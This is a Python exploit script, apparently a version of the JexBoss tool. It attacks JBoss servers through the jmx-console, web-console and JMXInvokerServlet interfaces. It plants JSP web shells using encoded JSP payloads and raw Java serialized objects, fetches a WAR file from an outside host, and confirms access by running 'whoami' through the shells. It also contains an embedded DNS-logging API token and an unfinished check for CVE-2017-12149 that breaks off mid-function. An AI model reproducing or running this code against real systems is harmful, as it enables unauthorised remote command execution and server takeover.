#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
import json
import random
import requests
from string import letters
from sys import exit, version_info
from time import sleep
from random import randint

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3 import disable_warnings, PoolManager
    from urllib3.util.timeout import Timeout
except ImportError:
    ver = version_info[0] if version_info[0] >= 3 else ""
    raise ("\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
           + "   Example: \n"
           + "   # apt-get install python%s-pip ; easy_install%s urllib3\n" % (ver, ver))

from urllib3 import disable_warnings, PoolManager
from urllib3.util.timeout import Timeout

disable_warnings()

timeout = Timeout(connect=3.0, read=6.0)
pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')

user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
               "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
               "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
               "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]



ceye_domain = 'x.ceye.io'
ceye_api = '2ac0ac1cdda59cb5ea6e034d5f15f178'


def ceye_dnslog(api_url,banner):
    req=requests.get(api_url)
    try:
        name = req.json()['data'][0]['name']
        if banner in name:
            return True
    except Exception:
        return False


def get_successfully(url, path):
    """
    Test if a GET to a URL is successful
    :param url: The base URL
    :param path: The URL path
    :return: The HTTP status code
    """
    sleep(5)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    r = pool.request('GET', url + path, redirect=False, headers=headers)
    result = r.status
    if result == 404:
        sleep(7)
        r = pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
    return result


def exploit_jmx_console_main_deploy(url):
    """
    Exploit MainDeployer to deploy a JSP shell. Does not work in JBoss 5 (bug in JBoss 5).
    /jmx-console/HtmlAdaptor
    :param url: The url to exploit
    :return: The HTTP status code
    """
    if not 'http' in url[:4]:
        url = "http://" + url

    jsp = "http://www.joaomatosf.com/rnp/jexws.war"
    if not requests.get(url=jsp).ok:print 'connect fail to "http://www.joaomatosf.com/rnp/jexws.war"'
    payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
               "MainDeployer&methodIndex=19&arg0=" + jsp)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/jexws/jexjmx.jsp")


def exploit_jmx_console_file_repository(url):
    """
    Exploit DeploymentFileRepository to deploy a JSP shell
    Tested and working in JBoss 4, 5. Does not work in JBoss 6.
    /jmx-console/HtmlAdaptor
    :param url: The URL to exploit
    :return: The HTTP status code
    """
    jsp = ("%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%2c%20%6a%61%76%61%2e%6e%65%74%2e%2a%22%20%70%61%67%65%45%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%25%3e%3c%70%72%65%3e%3c%25%69%66%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%70%70%22%29%20%21%3d%20%6e%75%6c%6c%29%7b%20%55%52%4c%20%75%72%6c%20%3d%20%6e%65%77%20%55%52%4c%28%22%68%74%74%70%3a%2f%2f%77%65%62%73%68%65%6c%6c%2e%6a%65%78%62%6f%73%73%2e%6e%65%74%2f%22%29%3b%20%48%74%74%70%55%52%4c%43%6f%6e%6e%65%63%74%69%6f%6e%20%63%68%65%63%6b%20%3d%20%28%48%74%74%70%55%52%4c%43%6f%6e%6e%65%63%74%69%6f%6e%29%20%75%72%6c%2e%6f%70%65%6e%43%6f%6e%6e%65%63%74%69%6f%6e%28%29%3b%20%53%74%72%69%6e%67%20%77%72%69%74%65%70%65%72%6d%69%73%73%69%6f%6e%20%3d%20%28%6e%65%77%20%44%61%74%65%28%29%2e%74%6f%53%74%72%69%6e%67%28%29%2e%73%70%6c%69%74%28%22%3a%22%29%5b%30%5d%2b%22%68%2e%6c%6f%67%22%29%2e%72%65%70%6c%61%63%65%41%6c%6c%28%22%20%22%2c%20%22%2d%22%29%3b%20%53%74%72%69%6e%67%20%73%68%5b%5d%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%70%70%22%29%2e%73%70%6c%69%74%28%22%20%22%29%3b%20%63%68%65%63%6b%2e%73%65%74%52%65%71%75%65%73%74%50%72%6f%70%65%72%74%79%28%22%55%73%65%72%2d%41%67%65%6e%74%22%2c%20%72%65%71%75%65%73%74%2e%67%65%74%48%65%61%64%65%72%28%22%48%6f%73%74%22%29%2b%22%3c%2d%22%2b%72%65%71%75%65%73%74%2e%67%65%74%52%65%6d%6f%74%65%41%64%64%72%28%29%29%3b%20%69%66%20%28%21%6e%65%77%20%46%69%6c%65%28%22%63%68%65%63%6b%5f%22%2b%77%72%69%74%65%70%65%72%6d%69%73%73%69%6f%6e%29%2e%65%78%69%73%74%73%28%29%29%7b%20%50%72%69%6e%74%57%72%69%74%65%72%20%77%72%69%74%65%72%20%3d%20%6e%65%77%20%50%72%69%6e%74%57%72%69%74%65%72%28%22%63%68%65%63%6b%5f%22%2b%77%72%69%74%65%70%65%72%6d%69%73%73%69%6f%6e%29%3b%20%63%68%65%63%6b%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%20%77%72%69%74%65%72%2e%63%6c%6f%73%65%28%29%3b%20%7d%20%65%6c%73%65%20%69%66%20%28%73%68%5b%30%5d%2e%63%6f%6e%74%61%69%6e%73%28%22%69%64%22%29%20%7c%7c%20%73%68%5b%30%5d%2e%63%6f%6e%74%61%69%6e%73%28%22%69%70%63%6f%6e%66%69%67%22%29%29%20%63%68%65%63%6b%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%20%74%72%79%20%7b%20%50%72%6f%63%65%73%73%20%70%3b%20%69%66%20%28%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%69%6e%64%65%78%4f%66%28%22%77%69%6e%22%29%20%3e%20%30%29%7b%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%6d%64%2e%65%78%65%20%2f%63%20%22%2b%73%68%29%3b%20%7d%20%65%6c%73%65%20%7b%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%73%68%29%3b%7d%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%64%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%20%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%77%68%69%6c%65%20%28%64%69%73%72%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%20%64%69%73%72%20%3d%20%64%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%7d%20%7d%63%61%74%63%68%28%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%55%6e%6b%6e%6f%77%6e%20%63%6f%6d%6d%61%6e%64%2e%22%29%3b%7d%7d%25%3e")

    payload = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
               "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
               "jexjmx.war&argType=java.lang.String&arg1=jexjmx&argType=java.lang.St"
               "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp + "&argType=boolean&arg4=True")

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/jexjmx/jexjmx.jsp")


def exploit_jmx_invoker_file_repository(url, version):
    """
    Exploits the JMX invoker
    tested and works in JBoss 4, 5
    MainDeploy, shell in data
    # /invoker/JMXInvokerServlet
    :param url: The URL to exploit
    :return:
    """
    payload = ("\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e"
               "\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c"
               "\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xf6\x06\x95\x27\x41\x3e\xa4"
               "\xbe\x0c\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72"
               "\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72"
               "\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65"
               "\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65"
               "\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70")
    payload += ("\xe3\x2c\x60\xe6") if version == 0 else ("\x26\x95\xbe\x0a")
    payload += (
        "\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61"
        "\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75"
        "\x65\xea\xcc\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x7a\x00\x00\x04\x00"
        "\x00\x00\x05\xaa\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e"
        "\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29"
        "\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x1b\x6a\x61\x76\x61\x78"
        "\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e"
        "\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x2c"
        "\x6a\x62\x6f\x73\x73\x2e\x61\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69\x63\x65"
        "\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69\x6c\x65\x52\x65\x70\x6f"
        "\x73\x69\x74\x6f\x72\x79\x78\x74\x00\x05\x73\x74\x6f\x72\x65\x75\x71\x00\x7e"
        "\x00\x00\x00\x00\x00\x05\x74\x00\x0a\x6a\x65\x78\x69\x6e\x76\x2e\x77\x61\x72"
        "\x74\x00\x06\x6a\x65\x78\x69\x6e\x76\x74\x00\x04\x2e\x6a\x73\x70\x74\x04\x71"
        "\x3c\x25\x40\x20\x70\x61\x67\x65\x20\x69\x6d\x70\x6f\x72\x74\x3d\x22\x6a\x61"
        "\x76\x61\x2e\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a"
        "\x2c\x20\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x2a\x22\x20\x70\x61\x67\x65\x45"
        "\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x55\x54\x46\x2d\x38\x22\x25\x3e\x3c\x70"
        "\x72\x65\x3e\x3c\x25\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74"
        "\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d"
        "\x20\x6e\x75\x6c\x6c\x29\x7b\x20\x55\x52\x4c\x20\x75\x72\x6c\x20\x3d\x20\x6e"
        "\x65\x77\x20\x55\x52\x4c\x28\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x65\x62\x73"
        "\x68\x65\x6c\x6c\x2e\x6a\x65\x78\x62\x6f\x73\x73\x2e\x6e\x65\x74\x2f\x22\x29"
        "\x3b\x20\x48\x74\x74\x70\x55\x52\x4c\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e"
        "\x20\x63\x68\x65\x63\x6b\x20\x3d\x20\x28\x48\x74\x74\x70\x55\x52\x4c\x43\x6f"
        "\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x29\x20\x75\x72\x6c\x2e\x6f\x70\x65\x6e\x43"
        "\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x28\x29\x3b\x20\x53\x74\x72\x69\x6e\x67"
        "\x20\x77\x72\x69\x74\x65\x70\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x3d\x20"
        "\x28\x6e\x65\x77\x20\x44\x61\x74\x65\x28\x29\x2e\x74\x6f\x53\x74\x72\x69\x6e"
        "\x67\x28\x29\x2e\x73\x70\x6c\x69\x74\x28\x22\x3a\x22\x29\x5b\x30\x5d\x2b\x22"
        "\x68\x2e\x6c\x6f\x67\x22\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x41\x6c\x6c\x28"
        "\x22\x20\x22\x2c\x20\x22\x2d\x22\x29\x3b\x20\x53\x74\x72\x69\x6e\x67\x20\x73"
        "\x68\x5b\x5d\x20\x3d\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61"
        "\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x2e\x73\x70\x6c\x69"
        "\x74\x28\x22\x20\x22\x29\x3b\x20\x63\x68\x65\x63\x6b\x2e\x73\x65\x74\x52\x65"
        "\x71\x75\x65\x73\x74\x50\x72\x6f\x70\x65\x72\x74\x79\x28\x22\x55\x73\x65\x72"
        "\x2d\x41\x67\x65\x6e\x74\x22\x2c\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65"
        "\x74\x48\x65\x61\x64\x65\x72\x28\x22\x48\x6f\x73\x74\x22\x29\x2b\x22\x3c\x2d"
        "\x22\x2b\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x52\x65\x6d\x6f\x74\x65"
        "\x41\x64\x64\x72\x28\x29\x29\x3b\x20\x69\x66\x20\x28\x21\x6e\x65\x77\x20\x46"
        "\x69\x6c\x65\x28\x22\x63\x68\x65\x63\x6b\x5f\x22\x2b\x77\x72\x69\x74\x65\x70"
        "\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x29\x2e\x65\x78\x69\x73\x74\x73\x28\x29"
        "\x29\x7b\x20\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x20\x77\x72\x69\x74"
        "\x65\x72\x20\x3d\x20\x6e\x65\x77\x20\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65"
        "\x72\x28\x22\x63\x68\x65\x63\x6b\x5f\x22\x2b\x77\x72\x69\x74\x65\x70\x65\x72"
        "\x6d\x69\x73\x73\x69\x6f\x6e\x29\x3b\x20\x63\x68\x65\x63\x6b\x2e\x67\x65\x74"
        "\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x3b\x20\x77\x72\x69\x74"
        "\x65\x72\x2e\x63\x6c\x6f\x73\x65\x28\x29\x3b\x20\x7d\x20\x65\x6c\x73\x65\x20"
        "\x69\x66\x20\x28\x73\x68\x5b\x30\x5d\x2e\x63\x6f\x6e\x74\x61\x69\x6e\x73\x28"
        "\x22\x69\x64\x22\x29\x20\x7c\x7c\x20\x73\x68\x5b\x30\x5d\x2e\x63\x6f\x6e\x74"
        "\x61\x69\x6e\x73\x28\x22\x69\x70\x63\x6f\x6e\x66\x69\x67\x22\x29\x29\x20\x63"
        "\x68\x65\x63\x6b\x2e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d"
        "\x28\x29\x3b\x20\x74\x72\x79\x20\x7b\x20\x50\x72\x6f\x63\x65\x73\x73\x20\x70"
        "\x3b\x20\x69\x66\x20\x28\x53\x79\x73\x74\x65\x6d\x2e\x67\x65\x74\x50\x72\x6f"
        "\x70\x65\x72\x74\x79\x28\x22\x6f\x73\x2e\x6e\x61\x6d\x65\x22\x29\x2e\x74\x6f"
        "\x4c\x6f\x77\x65\x72\x43\x61\x73\x65\x28\x29\x2e\x69\x6e\x64\x65\x78\x4f\x66"
        "\x28\x22\x77\x69\x6e\x22\x29\x20\x3e\x20\x30\x29\x7b\x20\x70\x20\x3d\x20\x52"
        "\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x7a\x00"
        "\x00\x01\xb2\x28\x29\x2e\x65\x78\x65\x63\x28\x22\x63\x6d\x64\x2e\x65\x78\x65"
        "\x20\x2f\x63\x20\x22\x2b\x73\x68\x29\x3b\x20\x7d\x20\x65\x6c\x73\x65\x20\x7b"
        "\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74"
        "\x69\x6d\x65\x28\x29\x2e\x65\x78\x65\x63\x28\x73\x68\x29\x3b\x7d\x20\x42\x75"
        "\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x20\x64\x20\x3d\x20\x6e\x65"
        "\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x28\x6e\x65"
        "\x77\x20\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x52\x65\x61\x64\x65\x72"
        "\x28\x70\x2e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29"
        "\x29\x29\x3b\x20\x53\x74\x72\x69\x6e\x67\x20\x64\x69\x73\x72\x20\x3d\x20\x64"
        "\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x77\x68\x69\x6c\x65\x20"
        "\x28\x64\x69\x73\x72\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x29\x20\x7b\x20\x6f\x75"
        "\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28\x64\x69\x73\x72\x29\x3b\x20\x64\x69"
        "\x73\x72\x20\x3d\x20\x64\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20"
        "\x7d\x20\x7d\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x20"
        "\x65\x29\x20\x7b\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28\x22\x55\x6e"
        "\x6b\x6e\x6f\x77\x6e\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x2e\x22\x29\x3b\x7d\x7d"
        "\x25\x3e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x42\x6f\x6f"
        "\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee\x02\x00\x01\x5a\x00\x05\x76"
        "\x61\x6c\x75\x65\x78\x70\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c"
        "\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47"
        "\x02\x00\x00\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61"
        "\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x0f\x71\x00\x7e\x00\x0f"
        "\x71\x00\x7e\x00\x0f\x74\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e\x69\x0e\x8b\x92"
        "\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00\x01\x73\x72\x00\x22\x6f\x72\x67\x2e"
        "\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e"
        "\x76\x6f\x63\x61\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9"
        "\x02\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00\x00\x04"
        "\x70\x78")

    headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
               "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    r = pool.urlopen('POST', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
    result = r.status

    if result == 401:
        pass
    pool.urlopen('HEAD', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
    return get_successfully(url, "/jexinv/jexinv.jsp")


def exploit_web_console_invoker(url):
    """
    Exploits web console invoker
    Does not work in JBoss 5 (bug in JBoss5)
    :param url: The URL to exploit
    :return: The HTTP status code
    """
    payload = (
        "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e"
        "\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f"
        "\x74\x65\x4d\x42\x65\x61\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f"
        "\xa3\x7a\x74\xae\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e"
        "\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74"
        "\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73\x74\x00\x13\x5b\x4c"
        "\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x00"
        "\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61"
        "\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72"
        "\x67\x65\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a\x61"
        "\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f\x4f\x62\x6a\x65"
        "\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06\x64\x65\x70\x6c\x6f\x79\x75"
        "\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65"
        "\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00"
        "\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25"
        "\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64"
        "\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74"
        "\x79\x71\x00\x7e\x00\x01\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x01\x4c"
        "\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x01\x4c\x00\x08\x70\x72\x6f\x74\x6f"
        "\x63\x6f\x6c\x71\x00\x7e\x00\x01\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x01"
        "\x78\x70\xff\xff\xff\xff\xff\xff\xff\xff\x74\x00\x0e\x6a\x6f\x61\x6f\x6d\x61"
        "\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x74\x00\x0e\x2f\x72\x6e\x70\x2f\x6a\x65\x78"
        "\x77\x73\x2e\x77\x61\x72\x71\x00\x7e\x00\x0b\x74\x00\x04\x68\x74\x74\x70\x70"
        "\x78\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74"
        "\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
        "\x00\x00\x01\x74\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x73"
        "\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74"
        "\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf"
        "\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
        "\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f"
        "\x79\x65\x72\x78")

    headers = {
        "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Connection": "keep-alive",
        "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    r = pool.urlopen('POST', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
    result = r.status
    if result == 401:
        pass
    pool.urlopen('HEAD', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
    return get_successfully(url, "/jexws/jexws.jsp")


def auto_exploit(url, exploit_type):
    result = 505
    if exploit_type == "jmx-console":
        result = exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = exploit_jmx_console_main_deploy(url)
    elif exploit_type == "web-console":
        result = exploit_web_console_invoker(url)
    elif exploit_type == "JMXInvokerServlet":
        result = exploit_jmx_invoker_file_repository(url, 0)
        if result != 200 and result != 500:
            result = exploit_jmx_invoker_file_repository(url, 1)

    if result == 200 or result == 500:
        return True


def jexws(url):
    """
    Test if a GET to a URL is successful
    :param url: The URL to test
    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
    """
    urls=[]
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console": "/web-console/ServerInfo.jsp",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
    for i in paths.keys():
        try:
            r = pool.request('HEAD', url + str(paths[i]), redirect=True, headers=headers)
            paths[i] = r.status
            if paths[i] == 200 or paths[i] == 500:
                exploit_type = str(i)
                is_ok=auto_exploit(url, exploit_type)
                if is_ok:
                    url= url if '://' in url else 'http://'+url
                    for shell in ['/jexinv/jexinv.jsp?ppp=whoami',
                                  '/jexws/jexws.jsp?ppp=whoami',
                                  '/jexjmx/jexjmx.jsp?ppp=whoami'
                                  ]:

                        req=requests.get(url=url+shell,headers=headers)
                        if req.status_code != 404:
                            urls.append(req.url)
        except Exception:
            pass

    return set(urls) if len(urls) > 0 else False



def cve_2017_12149(url):
    url = "http://" + url if '://' not in url else url.rstrip('/')
    banner=''.join([random.choice(letters) for i in range(4)])
    domain=ceye_domain.encode('hex')
    name=banner.encode('hex')
    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
    query=url+'/invoker/readonly'
